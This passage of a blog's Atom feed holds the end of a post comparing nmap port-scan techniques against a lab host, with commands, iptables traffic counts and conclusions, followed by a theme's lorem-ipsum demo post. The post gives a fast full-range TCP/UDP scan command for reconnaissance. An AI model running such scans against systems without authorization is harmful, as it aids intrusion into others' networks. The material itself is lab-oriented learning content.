+Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
+pkts bytes target     prot opt in     out     source               destination
+Chain OUTPUT (policy ACCEPT 1302 packets, 167K bytes)
+pkts bytes target     prot opt in     out     source               destination
+1283 56440 ACCEPT     all  ---  *      *       0.0.0.0/0            10.11.1.5
+0     0 ACCEPT     all  ---  *      *       0.0.0.0/0            10.11.1.5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Test 3:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents# nmap -sT 10.11.1.5
+Starting Nmap 7.60 ( https://nmap.org ) at 2018-05-26 17:43 BST
+Nmap scan report for 10.11.1.5
+Host is up (0.12s latency).
+Not shown: 998 closed ports
+PORT    STATE SERVICE
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+MAC Address: 00:50:56:89:70:15 (VMware)
+Nmap done: 1 IP address (1 host up) scanned in 20.35 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Results:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents# iptables -vn -L
+Chain INPUT (policy ACCEPT 1264 packets, 184K bytes)
+pkts bytes target     prot opt in     out     source               destination
+1199 48576 ACCEPT     all  ---  *      *       10.11.1.5            0.0.0.0/0
+0     0 ACCEPT     all  ---  *      *       10.11.1.5            0.0.0.0/0
+0     0 ACCEPT     all  ---  *      *       10.11.1.5            0.0.0.0/0
+Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
+pkts bytes target     prot opt in     out     source               destination
+Chain OUTPUT (policy ACCEPT 1206 packets, 175K bytes)
+pkts bytes target     prot opt in     out     source               destination
+1200 71968 ACCEPT     all  ---  *      *       0.0.0.0/0            10.11.1.5
+0     0 ACCEPT     all  ---  *      *       0.0.0.0/0            10.11.1.5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;conclusion-and-my-thoughts&quot;&gt;Conclusion and my thoughts:&lt;/h2&gt;
+&lt;p&gt;After completing the above tests, I was able to view the amount of traffic that was sent over the network using my chosen technique compared to the others. Yes, lots of data was sent across to complete the task, however scanning results were presented in just under 52 seconds. Personally, if I know the environment can handle this scan – I will happily use it as a starting point.&lt;/p&gt;
+
+&lt;p&gt;In this case, the entire port range scan didn’t pick up any obscure ports on the system – however it did miss a service port that was found within the default scan. As I mentioned before, it can sometimes return incorrect or misleading data but if the system had a couple of services running on higher, uncommon ports – the chances of spotting them with this scan are much higher than the other tested methods. I would also accompany this scan with additional scans, to help back these results up however the scope of ports to check will hopefully be narrowed down by this point.&lt;/p&gt;
+
+&lt;p&gt;I would be interested to hear feedback about this technique and whether or not there are further ways to increase the reliability of the results as well as maintaining the speed. Let me know your thoughts on twitter.&lt;/p&gt;
+
+&lt;p&gt;Thanks for reading.&lt;/p&gt;</content><author><name>Crawl3r</name></author><summary type="html">Intro Recently I have been using a specific scan for my initial checks on a target system. The method I use scans the entire range of ports on both the TCP and UDP channels. As it has helped me out so much, I thought I would share. Disclaimer: This technique is most likely known and used by many, but fingers crossed some viewers will find use for it! I have only ever performed this within CTF’s/lab environments, please be sure to understand your target environment before firing off scans blindly. The command: nmap -sT -sU --min-rate 5000 --max-retries 1 -p- &amp;lt;target&amp;gt; Arguments: -sT : TCP Connect() technique -sU : enable UDP scanning –min-rate : sets the slowest amount packets that can be sent each second –max-retries : limits the number of port scan probe retransmissions -p- : Specifies to scan the entire port range (1 to 65535) To view all other possibilities, check out nmap’s man page. Benefits: Very quick scan Probes every possible port on the target, not just the top 1000 common ports like other scans Can help identify obscure ports that are being utilised by services Detriments: Not the quiestest traffic (see below for test results) Can produce results that misses a port that is found in another scan Tests: In order to help understand one of the detriments I listed above, I wanted to perform a couple of nmap scans against a chosen target, on a safe network. I used iptables to gather the results. In order to make sure the traffic was gathered during a scan, I configured iptables using the following set of commands. root@kali:~/Documents# iptables -I INPUT 1 -s 10.11.1.5 -j ACCEPT root@kali:~/Documents# iptables -I OUTPUT 1 -d 10.11.1.5 -j ACCEPT root@kali:~/Documents# iptables -Z The main focus of the tests was to gain an understanding of the amount of bytes that were sent across the network during a scan, relative to the time it took to complete and the ports that were found during a scan. I made sure to clear the obtained data before each different scan (-Z argument). Test 1: My chosen technique, scanning the entire port range across both TCP and UDP channels. root@kali:~/Documents# nmap -sT -sU --min-rate 5000 --max-retries 1 -p- 10.11.1.5 Not shown: 61350 closed ports, 57737 filtered ports, 11980 open|filtered ports PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 135/udp open msrpc MAC Address: 00:50:56:89:70:15 (VMware) Nmap done: 1 IP address (1 host up) scanned in 51.75 seconds Results: root@kali:~/Documents# iptables -vn -L Chain INPUT (policy ACCEPT 201K packets, 29M bytes) pkts bytes target prot opt in out source destination 201K 9725K ACCEPT all --- * * 10.11.1.5 0.0.0.0/0 0 0 ACCEPT all --- * * 10.11.1.5 0.0.0.0/0 0 0 ACCEPT all --- * * 10.11.1.5 0.0.0.0/0 Chain FORWARD (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination Chain OUTPUT (policy ACCEPT 254K packets, 33M bytes) pkts bytes target prot opt in out source destination 254K 11M ACCEPT all --- * * 0.0.0.0/0 10.11.1.5 0 0 ACCEPT all --- * * 0.0.0.0/0 10.11.1.5 Test 2: Notes: Default nmap scan, top 1000 common ports root@kali:~/Documents# nmap 10.11.1.5 Starting Nmap 7.60 ( https://nmap.org ) at 2018-05-26 16:29 BST Nmap scan report for 10.11.1.5 Host is up (0.13s latency). Not shown: 997 closed ports PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 3389/tcp open ms-wbt-server MAC Address: 00:50:56:89:70:15 (VMware) Nmap done: 1 IP address (1 host up) scanned in 7.11 seconds Results: root@kali:~/Documents# iptables -vn -L Chain INPUT (policy ACCEPT 1378 packets, 205K bytes) pkts bytes target prot opt in out source destination 1185 47980 ACCEPT all --- * * 10.11.1.5 0.0.0.0/0 0 0 ACCEPT all --- * * 10.11.1.5 0.0.0.0/0 0 0 ACCEPT all --- * * 10.11.1.5 0.0.0.0/0 Chain FORWARD (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination Chain OUTPUT (policy ACCEPT 1302 packets, 167K bytes) pkts bytes target prot opt in out source destination 1283 56440 ACCEPT all --- * * 0.0.0.0/0 10.11.1.5 0 0 ACCEPT all --- * * 0.0.0.0/0 10.11.1.5 Test 3: root@kali:~/Documents# nmap -sT 10.11.1.5 Starting Nmap 7.60 ( https://nmap.org ) at 2018-05-26 17:43 BST Nmap scan report for 10.11.1.5 Host is up (0.12s latency). Not shown: 998 closed ports PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn MAC Address: 00:50:56:89:70:15 (VMware) Nmap done: 1 IP address (1 host up) scanned in 20.35 seconds Results: root@kali:~/Documents# iptables -vn -L Chain INPUT (policy ACCEPT 1264 packets, 184K bytes) pkts bytes target prot opt in out source destination 1199 48576 ACCEPT all --- * * 10.11.1.5 0.0.0.0/0 0 0 ACCEPT all --- * * 10.11.1.5 0.0.0.0/0 0 0 ACCEPT all --- * * 10.11.1.5 0.0.0.0/0 Chain FORWARD (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination Chain OUTPUT (policy ACCEPT 1206 packets, 175K bytes) pkts bytes target prot opt in out source destination 1200 71968 ACCEPT all --- * * 0.0.0.0/0 10.11.1.5 0 0 ACCEPT all --- * * 0.0.0.0/0 10.11.1.5 Conclusion and my thoughts: After completing the above tests, I was able to view the amount of traffic that was sent over the network using my chosen technique compared to the others. Yes, lots of data was sent across to complete the task, however scanning results were presented in just under 52 seconds. Personally, if I know the environment can handle this scan – I will happily use it as a starting point. In this case, the entire port range scan didn’t pick up any obscure ports on the system – however it did miss a service port that was found within the default scan. As I mentioned before, it can sometimes return incorrect or misleading data but if the system had a couple of services running on higher, uncommon ports – the chances of spotting them with this scan are much higher than the other tested methods. I would also accompany this scan with additional scans, to help back these results up however the scope of ports to check will hopefully be narrowed down by this point. I would be interested to hear feedback about this technique and whether or not there are further ways to increase the reliability of the results as well as maintaining the speed. Let me know your thoughts on twitter. Thanks for reading.</summary></entry><entry><title type="html">Example Content</title><link href="http://localhost:4000/2017-03-16/example-content" rel="alternate" type="text/html" title="Example Content" /><published>2017-03-16T00:00:00+00:00</published><updated>2017-03-16T00:00:00+00:00</updated><id>http://localhost:4000/2017-03-16/example-content</id><content type="html" xml:base="http://localhost:4000/2017-03-16/example-content">&lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Maecenas tincidunt ornare nibh, non elementum augue tempus eget. Pellentesque tempus scelerisque iaculis. Nullam interdum ultricies nibh quis sollicitudin. Donec ornare fermentum facilisis. Ut at sem ac sem imperdiet varius a eget tortor. Nam eu augue eget orci semper maximus in eget augue. Mauris ornare, nisl ut suscipit consectetur, mi quam interdum tellus, at rutrum quam eros ultrices mi.&lt;/p&gt;
+
+&lt;h1 id=&quot;headers&quot;&gt;Headers&lt;/h1&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-markdown&quot; data-lang=&quot;markdown&quot;&gt;&lt;span class=&quot;gh&quot;&gt;# H1&lt;/span&gt;
+&lt;span class=&quot;gu&quot;&gt;## H2&lt;/span&gt;
+&lt;span class=&quot;gu&quot;&gt;### H3&lt;/span&gt;
+&lt;span class=&quot;gu&quot;&gt;#### H4&lt;/span&gt;
+&lt;span class=&quot;gu&quot;&gt;##### H5&lt;/span&gt;
+&lt;span class=&quot;gu&quot;&gt;###### H6&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h1 id=&quot;h1&quot;&gt;H1&lt;/h1&gt;
+&lt;h2 id=&quot;h2&quot;&gt;H2&lt;/h2&gt;
+&lt;h3 id=&quot;h3&quot;&gt;H3&lt;/h3&gt;
+&lt;h4 id=&quot;h4&quot;&gt;H4&lt;/h4&gt;
+&lt;h5 id=&quot;h5&quot;&gt;H5&lt;/h5&gt;
+&lt;h6 id=&quot;h6&quot;&gt;H6&lt;/h6&gt;
+
+&lt;h1 id=&quot;text-formatting&quot;&gt;Text formatting&lt;/h1&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-markdown&quot; data-lang=&quot;markdown&quot;&gt;&lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;gs&quot;&gt;**Bold**&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; _Italics_
+&lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; ~~Strikethrough~~
+&lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;ins&amp;gt;&lt;/span&gt;Underline&lt;span class=&quot;nt&quot;&gt;&amp;lt;/ins&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;sup&amp;gt;&lt;/span&gt;Superscript&lt;span class=&quot;nt&quot;&gt;&amp;lt;/sup&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;sub&amp;gt;&lt;/span&gt;Subscript&lt;span class=&quot;nt&quot;&gt;&amp;lt;/sub&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; Abbreviation: &lt;span class=&quot;nt&quot;&gt;&amp;lt;abbr&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;title=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;HyperText Markup Language&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;HTML&lt;span class=&quot;nt&quot;&gt;&amp;lt;/abbr&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; Citation: &lt;span class=&quot;nt&quot;&gt;&amp;lt;cite&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;mdash;&lt;/span&gt; Chester How&lt;span class=&quot;nt&quot;&gt;&amp;lt;/cite&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Bold&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;Italics&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;del&gt;Strikethrough&lt;/del&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;ins&gt;Underline&lt;/ins&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;sup&gt;Superscript&lt;/sup&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;sub&gt;Subscript&lt;/sub&gt;&lt;/li&gt;
+  &lt;li&gt;Abbreviation: &lt;abbr title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/abbr&gt;&lt;/li&gt;
+  &lt;li&gt;Citation: &lt;cite&gt;— Chester How&lt;/cite&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;lists&quot;&gt;Lists&lt;/h1&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-markdown&quot; data-lang=&quot;markdown&quot;&gt;&lt;span class=&quot;p&quot;&gt;1.&lt;/span&gt; Ordered list item 1
+&lt;span class=&quot;p&quot;&gt;2.&lt;/span&gt; Ordered list item 2
+&lt;span class=&quot;p&quot;&gt;3.&lt;/span&gt; Ordered list item 3
+&lt;span class=&quot;p&quot;&gt;
+*&lt;/span&gt; Unordered list item 1
+&lt;span class=&quot;p&quot;&gt;*&lt;/span&gt; Unordered list item 2
+&lt;span class=&quot;p&quot;&gt;*&lt;/span&gt; Unordered list item 3&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Ordered list item 1&lt;/li&gt;
+  &lt;li&gt;Ordered list item 2&lt;/li&gt;
+  &lt;li&gt;Ordered list item 3&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Unordered list item 1&lt;/li&gt;
+  &lt;li&gt;Unordered list item 2&lt;/li&gt;
+  &lt;li&gt;Unordered list item 3&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;links&quot;&gt;Links&lt;/h1&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-markdown&quot; data-lang=&quot;markdown&quot;&gt;Check out tale on &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;GitHub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;sx&quot;&gt;https://github.com/chesterhow/tale&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Check out tale on &lt;a href=&quot;https://github.com/chesterhow/tale&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h1 id=&quot;images&quot;&gt;Images&lt;/h1&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-markdown&quot; data-lang=&quot;markdown&quot;&gt;&lt;span class=&quot;p&quot;&gt;![&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Placeholder image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;sx&quot;&gt;https://placehold.it/800x400&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;&quot;Placeholder image&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;![&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Image with caption&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;sx&quot;&gt;https://placehold.it/700x400&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;&quot;Image with caption&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;ge&quot;&gt;_This is an image with a caption_&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://placehold.it/800x400&quot; alt=&quot;Placeholder image&quot; title=&quot;Placeholder image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://placehold.it/700x400&quot; alt=&quot;Image with caption&quot; title=&quot;Image with caption&quot; /&gt;
+&lt;em&gt;This is an image with a caption&lt;/em&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;code-and-syntax-highlighting&quot;&gt;Code and Syntax Highlighting&lt;/h1&gt;
+&lt;p&gt;Use back-ticks for &lt;code class=&quot;highlighter-rouge&quot;&gt;inline code&lt;/code&gt;. Multi-line code snippets are supported too through Pygments.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;c1&quot;&gt;// Sample javascript code&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;JavaScript syntax highlighting&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Sample python code&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Python syntax highlighting&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Adding &lt;code class=&quot;highlighter-rouge&quot;&gt;linenos&lt;/code&gt; to the Pygments tag enables line numbers.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+2
+3
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;c1&quot;&gt;// Sample javascript code&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;JavaScript syntax highlighting&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h1 id=&quot;blockquotes&quot;&gt;Blockquotes&lt;/h1&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-markdown&quot; data-lang=&quot;markdown&quot;&gt;&lt;span class=&quot;gt&quot;&gt;&amp;gt; Curabitur blandit tempus porttitor. Nullam quis risus eget urna mollis ornare vel eu leo. Nullam id dolor id nibh ultricies vehicula ut id elit.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Curabitur blandit tempus porttitor. Nullam quis risus eget urna mollis ornare vel eu leo. Nullam id dolor id nibh ultricies vehicula ut id elit.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h1 id=&quot;horizontal-rule--line-break&quot;&gt;Horizontal Rule &amp;amp; Line Break&lt;/h1&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-markdown&quot; data-lang=&quot;markdown&quot;&gt;Use &lt;span class=&quot;sb&quot;&gt;`&amp;lt;hr&amp;gt;`&lt;/span&gt; for horizontal rules
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;hr&amp;gt;&lt;/span&gt;
+
+and &lt;span class=&quot;sb&quot;&gt;`&amp;lt;br&amp;gt;`&lt;/span&gt; for line breaks.
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Use &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;hr&amp;gt;&lt;/code&gt; for horizontal rules&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;and &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;br&amp;gt;&lt;/code&gt; for line breaks.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;The end&lt;/em&gt;&lt;/p&gt;</content><author><name>Crawl3r</name></author><summary type="html">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Maecenas tincidunt ornare nibh, non elementum augue tempus eget. Pellentesque tempus scelerisque iaculis. Nullam interdum ultricies nibh quis sollicitudin. Donec ornare fermentum facilisis. Ut at sem ac sem imperdiet varius a eget tortor. Nam eu augue eget orci semper maximus in eget augue. Mauris ornare, nisl ut suscipit consectetur, mi quam interdum tellus, at rutrum quam eros ultrices mi.</summary></entry></feed>
